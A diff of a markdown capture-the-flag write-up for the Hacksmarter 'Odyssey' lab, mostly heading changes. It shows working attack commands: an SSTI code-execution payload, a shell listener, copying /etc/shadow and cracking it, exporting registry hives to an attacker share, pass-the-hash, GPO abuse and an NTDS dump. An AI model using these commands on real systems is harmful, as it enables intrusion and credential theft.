@@ -7,10 +7,10 @@ tags: [Odyssey, Hard, Windows, Linux, AD, SSTI, Privesc]
 image: assets/img/Writeup/Hacksmarter/Odyssey/odyssey.png
 ---
 
-## Enumeration
-# 🔎 NMAP
+# Enumeration
+## 🔎 NMAP
 
-## Nmap Scan – 10.1.0.0/24 (DC01, EC2AMAZ‑NS87CNK & Linux Host)
+ Nmap Scan – 10.1.0.0/24 (DC01, EC2AMAZ‑NS87CNK & Linux Host)
 
 
 **Command used:**
@@ -19,9 +19,9 @@ image: assets/img/Writeup/Hacksmarter/Odyssey/odyssey.png
 
 ---
 
-# 🖥 Host 1 – 10.1.206.2 (DC01.hsm.local)
+ 🖥 Host 1 – 10.1.206.2 (DC01.hsm.local)
 
-### ✔ Host Information
+ ✔ Host Information
 
 - **Detected hostname:** DC01.hsm.local
     
@@ -36,7 +36,7 @@ image: assets/img/Writeup/Hacksmarter/Odyssey/odyssey.png
 
 ---
 
-## 📡 Open Ports & Services
+📡 Open Ports & Services
 
 |Port|State|Service|Version / Information|
 |---|---|---|---|
@@ -55,7 +55,7 @@ image: assets/img/Writeup/Hacksmarter/Odyssey/odyssey.png
 
 ---
 
-## 🔐 RDP Certificate
+🔐 RDP Certificate
 
 - **CN:** DC01.hsm.local
     
@@ -68,9 +68,9 @@ image: assets/img/Writeup/Hacksmarter/Odyssey/odyssey.png
 
 ---
 
-# 🖥 Host 2 – 10.1.182.10 (EC2AMAZ‑NS87CNK.hsm.local)
+ 🖥 Host 2 – 10.1.182.10 (EC2AMAZ‑NS87CNK.hsm.local)
 
-### ✔ Host Information
+ ✔ Host Information
 
 - **Detected hostname:** EC2AMAZ‑NS87CNK.hsm.local
     
@@ -83,7 +83,7 @@ image: assets/img/Writeup/Hacksmarter/Odyssey/odyssey.png
 
 ---
 
-## 📡 Open Ports & Services
+ 📡 Open Ports & Services
 
 |Port|State|Service|Version / Information|
 |---|---|---|---|
@@ -94,9 +94,9 @@ image: assets/img/Writeup/Hacksmarter/Odyssey/odyssey.png
 
 ---
 
-# 🖥 Host 3 – 10.1.66.62 (Linux – Ubuntu)
+ 🖥 Host 3 – 10.1.66.62 (Linux – Ubuntu)
 
-### ✔ Host Information
+ ✔ Host Information
 
 - **OS:** Ubuntu Linux
     
@@ -105,7 +105,7 @@ image: assets/img/Writeup/Hacksmarter/Odyssey/odyssey.png
 
 ---
 
-## 📡 Open Ports & Services
+📡 Open Ports & Services
 
 |Port|State|Service|Version / Information|
 |---|---|---|---|
@@ -139,7 +139,7 @@ image: assets/img/Writeup/Hacksmarter/Odyssey/odyssey.png
 - SSH available with modern OpenSSH.
 
 ### SMB
-#### I first created a Winhosts file with the two IP addresses, and then used nxc to generate my /etc/hosts file.
+ I first created a Winhosts file with the two IP addresses, and then used nxc to generate my /etc/hosts file.
 ```
  > cat WinHosts
 10.1.206.2
@@ -158,7 +158,7 @@ cat hosts
 
 ![1o](/assets/img/Writeup/Hacksmarter/Odyssey/1o.png)
 ### Kerbrute
-#### Using Kerbrute, I attempted to enumerate valid usernames on the Domain Controller, but without success.
+ Using Kerbrute, I attempted to enumerate valid usernames on the Domain Controller, but without success.
 ```
 kerbrute userenum --domain "hsm.local"  --dc DC01.hsm.local /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
 ```
@@ -166,19 +166,19 @@ kerbrute userenum --domain "hsm.local"  --dc DC01.hsm.local /usr/share/wordlists
 
 ## Web Enumeration
 
-#### On the Linux machine, I accessed the web application running on port 5000 and immediately launched a Feroxbuster scan in the background, which identified a `/login` endpoint.
+ On the Linux machine, I accessed the web application running on port 5000 and immediately launched a Feroxbuster scan in the background, which identified a `/login` endpoint.
 
 ![3o](/assets/img/Writeup/Hacksmarter/Odyssey/3o.png)
 ![5o](/assets/img/Writeup/Hacksmarter/Odyssey/5o.png)
 
-#### By submitting a single quote in the login form, the application returned a SQL query error. This indicates that the endpoint is likely vulnerable to SQL injection.
+ By submitting a single quote in the login form, the application returned a SQL query error. This indicates that the endpoint is likely vulnerable to SQL injection.
 ![6o](/assets/img/Writeup/Hacksmarter/Odyssey/6o.png)
 ![7o](/assets/img/Writeup/Hacksmarter/Odyssey/7o.png)
-#### Based on this error, I though it was possible to craft a valid SQL query to bypass the login. In this case, I launched SQLMap in the background as follows:
+ Based on this error, I though it was possible to craft a valid SQL query to bypass the login. In this case, I launched SQLMap in the background as follows:
 ```
 sqlmap -u "http://10.1.66.62:5000/login" --batch --dbs --level 5 --risk 3
 ```
-#### However, this did not yield anything valuable. I also tested a basic XSS payload, which executed successfully but did not provide any useful results either.
+ However, this did not yield anything valuable. I also tested a basic XSS payload, which executed successfully but did not provide any useful results either.
 
 ![8o](/assets/img/Writeup/Hacksmarter/Odyssey/8o.png)
 
@@ -206,16 +206,17 @@ Connection: keep-alive
 Priority: u=4
 
 ```
+## SSTI Discover
 #### After taking a break and reconsidering the attack surface, I remembered the Enter your template input field. Initially, I tried supplying my own IP address to trigger a hit on Responder, but then I noticed that the input was being reflected in the response.
 
 ![9o](/assets/img/Writeup/Hacksmarter/Odyssey/9o.png)
-#### This immediately made me think of a potential SSTI (Server‑Side Template Injection) vulnerability.
+ This immediately made me think of a potential SSTI (Server‑Side Template Injection) vulnerability.
 ```
 {% raw %} {{7*7}} {% endraw %}
 ```
 ![11o](/assets/img/Writeup/Hacksmarter/Odyssey/11o.png)
 
-#### By testing a simple SSTI payload, I was able to confirm code execution on the server and retrieve the username `ghill_sa`.
+ By testing a simple SSTI payload, I was able to confirm code execution on the server and retrieve the username `ghill_sa`.
 
 ```
 {% raw %} {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} {% endraw %}
@@ -224,13 +225,13 @@ Priority: u=4
 ![10o](/assets/img/Writeup/Hacksmarter/Odyssey/10o.png)
 ### SSTI Exploitation
 
-#### Using the following resource:  
-#### https://onsecurity.io/article/server-side-template-injection-with-jinja2/  
-#### I identified suitable SSTI payload examples.
-#### This allowed me to confirm **remote code execution** under the user context **`ghill_sa`**.
+ Using the following resource:  
+[Server-Side Template Injection with Jinja2](https://onsecurity.io/article/server-side-template-injection-with-jinja2/) 
+ I identified suitable SSTI payload examples.
+ This allowed me to confirm **remote code execution** under the user context **`ghill_sa`**.
 
-#### To proceed, I prepared my **listener** and crafted the payload.  
-#### I generated and sent the request through **Burp Suite**, as it provides a more convenient workflow for this type of testing.
+ To proceed, I prepared my **listener** and crafted the payload.  
+ I generated and sent the request through **Burp Suite**, as it provides a more convenient workflow for this type of testing.
 
 
 ```
@@ -242,29 +243,29 @@ pwncat-cs :443
 
 ![12o](/assets/img/Writeup/Hacksmarter/Odyssey/12o.png)
 ![13o](/assets/img/Writeup/Hacksmarter/Odyssey/13o.png)
-### Post-Exploitation Enumeration
+## Post-Exploitation Enumeration
 
-#### After obtaining a shell, I uploaded **LinPEAS** and **pspy** to perform a thorough privilege‑escalation enumeration.
+ After obtaining a shell, I uploaded **LinPEAS** and **pspy** to perform a thorough privilege‑escalation enumeration.
 
 ![14o](/assets/img/Writeup/Hacksmarter/Odyssey/14o.png)
-#### Sensitive SSH Key Exposure
+### Sensitive SSH Key Exposure
 
-#### During enumeration, I discovered that the `.ssh` directory inside the `ghill_sa` home folder contained a private SSH key.  
-#### The presence of a private key stored in a user’s home directory represents a significant security risk, as an attacker could potentially download and attempt to use it for unauthorized authentication.
+ During enumeration, I discovered that the `.ssh` directory inside the `ghill_sa` home folder contained a private SSH key.  
+ The presence of a private key stored in a user’s home directory represents a significant security risk, as an attacker could potentially download and attempt to use it for unauthorized authentication.
 
-#### This finding indicates improper key management practices and highlights the need for stronger access‑control policies and secure storage of SSH credentials. 
+ This finding indicates improper key management practices and highlights the need for stronger access‑control policies and secure storage of SSH credentials. 
 ![15o](/assets/img/Writeup/Hacksmarter/Odyssey/15o.png)
 
-#### I uploaded the key, set its permissions to `600`, and attempted to connect as `root` and it worked.
+ I uploaded the key, set its permissions to `600`, and attempted to connect as `root` and it worked.
 
 ![15.5o](/assets/img/Writeup/Hacksmarter/Odyssey/15.5o.png)
-#### Now that I had root access on the Linux host, my next steps were to consider potential pivoting options and perform local post‑exploitation enumeration.  
-#### This included reviewing the root directory and collecting interesting files for analysis.  
-#### I also inspected files such as `/etc/krb5.keytab` (in case the Linux host was integrated into the AD environment) as well as `/etc/passwd` and `/etc/shadow` to assess whether user password hashes could be recovered for offline analysis.
+ Now that I had root access on the Linux host, my next steps were to consider potential pivoting options and perform local post‑exploitation enumeration.  
+ This included reviewing the root directory and collecting interesting files for analysis.  
+ I also inspected files such as `/etc/krb5.keytab` (in case the Linux host was integrated into the AD environment) as well as `/etc/passwd` and `/etc/shadow` to assess whether user password hashes could be recovered for offline analysis.
 
-#### Since the `/etc/krb5.keytab` file was not present on the system, I focused on other locally available credential sources.  
-#### I retrieved both `/etc/passwd` and `/etc/shadow` using scp.
-#### After combining them with an unshadowing process, I was able to extract valid password hashes.
+ Since the `/etc/krb5.keytab` file was not present on the system, I focused on other locally available credential sources.  
+ I retrieved both `/etc/passwd` and `/etc/shadow` using scp.
+ After combining them with an unshadowing process, I was able to extract valid password hashes.
 ```
 scp -i id_ed25519 root@10.1.66.62:/etc/shadow .
 shadow
@@ -273,23 +274,25 @@ scp -i id_ed25519 root@10.1.66.62:/etc/passwd .
 passwd                         
 ```
 ![16o](/assets/img/Writeup/Hacksmarter/Odyssey/16o.png)
-#### Using John the Ripper for offline cracking, I successfully recovered the plaintext password from the extracted hash.  
-#### The password revealed was: **P@ssw0rd!**
+ Using John the Ripper for offline cracking, I successfully recovered the plaintext password from the extracted hash.  
+ The password revealed was: **P@ssw0rd!**
 ![17](/assets/img/Writeup/Hacksmarter/Odyssey/17.png)
-#### With this recovered password, I attempted to authenticate against the DC and the `EC2AMAZ-NS87CNK` host using `nxc` to check for possible credential reuse across the Windows environment.
+ With this recovered password, I attempted to authenticate against the DC and the `EC2AMAZ-NS87CNK` host using `nxc` to check for possible credential reuse across the Windows environment.
 
+## Shell as ghill_sa on EC2AMAZ-NS87CNK
 ```
 nxc rdp WinHosts -u 'ghill_sa' -p 'P@ssw0rd!' --local-auth
 ```
 ![18](/assets/img/Writeup/Hacksmarter/Odyssey/18.png)
-#### With valid credentials confirmed, I was able to access the `EC2AMAZ-NS87CNK` machine through RDP.  
-#### I connected using `xfreerdp` and began performing a full enumeration of the host to identify potential privilege‑escalation vectors and opportunities for lateral movement.
+ With valid credentials confirmed, I was able to access the `EC2AMAZ-NS87CNK` machine through RDP.  
+I connected using `xfreerdp` and began performing a full enumeration of the host to identify potential privilege‑escalation vectors and opportunities for lateral movement.
 
 ```
 xfreerdp /u:ghill_sa /p:'P@ssw0rd!' /v:10.1.182.10 /dynamic-resolution /cert:ignore
 ```
-#### After connecting to the machine, I explored the `C:\` drive.  
-#### Inside the `Share` directory, I found several notes and files left on the system, including the following discovery:
+###Smb Share
+ After connecting to the machine, I explored the `C:\` drive.  
+ Inside the `Share` directory, I found several notes and files left on the system, including the following discovery:
 
 ![20](/assets/img/Writeup/Hacksmarter/Odyssey/20.png)
 
@@ -298,12 +301,13 @@ Get-ChildItem *.txt | Where-Object { $_.Name -match "(Login|Access|Creds|Portal|
 ```
 
 ![23](/assets/img/Writeup/Hacksmarter/Odyssey/23.png)
-#### However, none of the passwords found in the notes were valid.  
-#### Running `whoami /all` revealed that the account belonged to a group with elevated or misconfigured privileges, indicating a potential privilege‑escalation path on the system.
+ However, none of the passwords found in the notes were valid.  
+ Running `whoami /all` revealed that the account belonged to a group with elevated or misconfigured privileges, indicating a potential privilege‑escalation path on the system.
 ![22](/assets/img/Writeup/Hacksmarter/Odyssey/22.png)
-#### As the account was a member of the **Backup Operators** group, it could access and back up sensitive system files.  
-#### Using this privilege, I created backups of the SYSTEM, SAM, and SECURITY hives.  
-#### Once exported, these files allowed me to perform an offline credential extraction using secretdump, recovering all local account hashes.
+## Privilege escalation of Backup Operators group
+ As the account was a member of the **Backup Operators** group, it could access and back up sensitive system files.  
+ Using this privilege, I created backups of the SYSTEM, SAM, and SECURITY hives.  
+ Once exported, these files allowed me to perform an offline credential extraction using secretdump, recovering all local account hashes.
 
 ```
 reg.py /"ghill_sa":'P@ssw0rd!'@"10.1.182.10"  backup -o '\\10.200.22.195\EXEGOL'
@@ -320,7 +324,7 @@ SAM.save  SECURITY.save  SYSTEM.save
 ```
 
 ![25](/assets/img/Writeup/Hacksmarter/Odyssey/25.png)
-#### Now that I had recovered the local Administrator hash, I was able to use `netexec` to reset the account’s password.
+ Now that I had recovered the local Administrator hash, I was able to use `netexec` to reset the account’s password.
 
 ```
 nxc smb 10.1.182.10 -u 'Administrator' -H 'd5cad8a9782b2879bf316f56936f1e36' --local-auth  -x 'net user Administrator Password123!'
@@ -329,12 +333,13 @@ SMB         10.1.182.10     445    EC2AMAZ-NS87CNK  [+] EC2AMAZ-NS87CNK\Administ
 SMB         10.1.182.10     445    EC2AMAZ-NS87CNK  [+] Executed command via wmiexec
 SMB         10.1.182.10     445    EC2AMAZ-NS87CNK  The command completed successfully.
 ```
-#### With the new Administrator password set, I could access the `C$` administrative share using `smbclientng` and retrieve the  flag.
+ With the new Administrator password set, I could access the `C$` administrative share using `smbclientng` and retrieve the  flag.
 
 
 ![26](/assets/img/Writeup/Hacksmarter/Odyssey/26.png)
 ## DC02
-#### With the `secretsdump` output, I created a user list and used Kerbrute to enumerate which accounts were valid.
+### Kerbrute
+ With the `secretsdump` output, I created a user list and used Kerbrute to enumerate which accounts were valid.
 ```
 > cat NewUsers.txt
 Administrator
@@ -369,44 +374,45 @@ bbarkinson
 kerbrute userenum --domain "hsm.local"  --dc DC01.hsm.local  NewUsers.txt
 ```
 ![27](/assets/img/Writeup/Hacksmarter/Odyssey/27.png)
-#### The *bbarkinson* account turned out to be valid, so let's try to authenticate using his NT hash.
+ The *bbarkinson* account turned out to be valid, so let's try to authenticate using his NT hash.
 
 ```
 nxc smb  10.1.206.2 -u 'bbarkinson' -H '53c3709ae3d9f4428a230db81361ffbc'
 RDP         10.1.206.2      3389   DC01             [*] Windows 10 or Windows Server 2016 Build 26100 (name:DC01) (domain:hsm.local) (nla:True)
 RDP         10.1.206.2      3389   DC01             [+] hsm.local\bbarkinson:53c3709ae3d9f4428a230db81361ffbc
 ```
-#### However, we can't perform Pass‑the‑Hash over RDP, so I went back to the Windows machine and tried to run SharpHound.  
-#### But the DC hostname wasn’t resolving properly, which prevented SharpHound from running correctly.
+ However, we can't perform Pass‑the‑Hash over RDP, so I went back to the Windows machine and tried to run SharpHound.  
+ But the DC hostname wasn’t resolving properly, which prevented SharpHound from running correctly.
 
 
 ![28](/assets/img/Writeup/Hacksmarter/Odyssey/28.png)
 ![30](/assets/img/Writeup/Hacksmarter/Odyssey/30.png)
-#### To ensure that *dc01.hsm.local* resolves correctly, I had to fix the DNS settings on the Windows machine.  
-#### I went through:
+### Dns resolution on DC01
+ To ensure that *dc01.hsm.local* resolves correctly, I had to fix the DNS settings on the Windows machine.  
+ I went through:
 
-#### **Control Panel → Network and Internet → Network and Sharing Center → Change adapter settings**  
-#### → Right‑click the network adapter → **Properties**  
-#### → Double‑click **Internet Protocol Version 4 (TCP/IPv4)**
+ **Control Panel → Network and Internet → Network and Sharing Center → Change adapter settings**  
+ → Right‑click the network adapter → **Properties**  
+ → Double‑click **Internet Protocol Version 4 (TCP/IPv4)**
 
-#### In the DNS section, I set:
+ In the DNS section, I set:
 
-#### - **Preferred DNS server:** IP address of the Domain Controller (DC01)  
-##### - **Alternate DNS server:** empty (or another DC if one exists)
+ - **Preferred DNS server:** IP address of the Domain Controller (DC01)  
+ - **Alternate DNS server:** empty (or another DC if one exists)
 
-#### After applying these settings, the DC hostname finally resolved properly.
+ After applying these settings, the DC hostname finally resolved properly.
 
 
 ![31](/assets/img/Writeup/Hacksmarter/Odyssey/31.png)
 ![32](/assets/img/Writeup/Hacksmarter/Odyssey/32.png)
 ![33](/assets/img/Writeup/Hacksmarter/Odyssey/33.png)
-#### And now… check the magic. 
+ And now… check the magic. 
 ![34](/assets/img/Writeup/Hacksmarter/Odyssey/34.png)
-#### Now that the domain controller is finally resolving, we need a valid domain account to continue.  
-#### Since we already discovered the **bbarkinson** account  and because AD user accounts can, by default, create a limited number of computer objects  we can leverage this by attempting to create a new machine account in the domain.
-
+ Now that the domain controller is finally resolving, we need a valid domain account to continue.  
+ Since we already discovered the **bbarkinson** account  and because AD user accounts can, by default, create a limited number of computer objects  we can leverage this by attempting to create a new machine account in the domain.
+### Creating a new user on DC01
 ![36](/assets/img/Writeup/Hacksmarter/Odyssey/36.png)
-#### We check the maq of **bbarkinson**.
+ We check the maq of **bbarkinson**.
 ```
  nxc ldap  10.1.206.2 -u 'bbarkinson' -H '53c3709ae3d9f4428a230db81361ffbc'  --local-auth -M maq
 LDAP        10.1.206.2      389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:hsm.local) (signing:Enforced) (channel binding:No TLS cert)
@@ -414,7 +420,7 @@ LDAP        10.1.206.2      389    DC01             [+] hsm.local\bbarkinson:53c
 MAQ         10.1.206.2      389    DC01             [*] Getting the MachineAccountQuota
 MAQ         10.1.206.2      389    DC01             MachineAccountQuota: 10
 ```
-#### We create the uzur account whit his Password.
+ We create the uzur account whit his Password.
 ```
 nxc smb  10.1.206.2 -u 'bbarkinson' -H '53c3709ae3d9f4428a230db81361ffbc'   -M add-computer -o NAME="uzur" PASSWORD='Password123!' --dns-server 10.1.206.2
 SMB         10.1.206.2      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:hsm.local) (signing:True) (SMBv1:None) (Null Auth:True)
@@ -424,17 +430,19 @@ ADD-COMP... 10.1.206.2      445    DC01             Successfully added the machi
 ```
 .\sh.exe -c all -d hsm.local --domaincontroller dc01.hsm.local --zipfilename dc01.zip --ldapusername uzur --ldappassword 'Password123!'
 ```
-####  After importing the ZIP into BloodHound, we can see that *bbarkinson* has **GenericWrite** permissions on the *Finance Policy* GPO.
+## Privesc On DC01
+### GenericWrite over a GPO
+  After importing the ZIP into BloodHound, we can see that *bbarkinson* has **GenericWrite** permissions on the *Finance Policy* GPO.
 
 ![37](/assets/img/Writeup/Hacksmarter/Odyssey/37.png)
-#### We can use **pygpoabuse** to modify and exploit this GPO by adding the compromised account *uzur* to the local Administrators group.
+ We can use **pygpoabuse** to modify and exploit this GPO by adding the compromised account *uzur* to the local Administrators group.
 ```
 pygpoabuse.py hsm.local/bbarkinson   -hashes :53c3709ae3d9f4428a230db81361ffbc  -gpo-id "526CDF3A-10B6-4B00-BCFA-36E59DCD71A2" -dc-ip  10.1.206.2  -command 'net localgroup Administrators "uzur$" /add' -f
 ```
 
 ![38](/assets/img/Writeup/Hacksmarter/Odyssey/38.png)
-#### With the **ntds** option in NetExec — and now that our `uzur` account effectively holds Domain Administrator privileges thanks to the abused GPO — we can dump the **NTDS.dit** and extract all domain password hashes, including the Domain Administrator’s NT hash.
-#### After retrieving the hashes, we can authenticate as the Domain Administrator and finally obtain the **final flag**.
+ With the **ntds** option in NetExec — and now that our `uzur` account effectively holds Domain Administrator privileges thanks to the abused GPO — we can dump the **NTDS.dit** and extract all domain password hashes, including the Domain Administrator’s NT hash.
+ After retrieving the hashes, we can authenticate as the Domain Administrator and finally obtain the **final flag**.
 
 ```
 nxc smb dc01.hsm.local -u 'uzur$' -p 'Password123!' --ntds
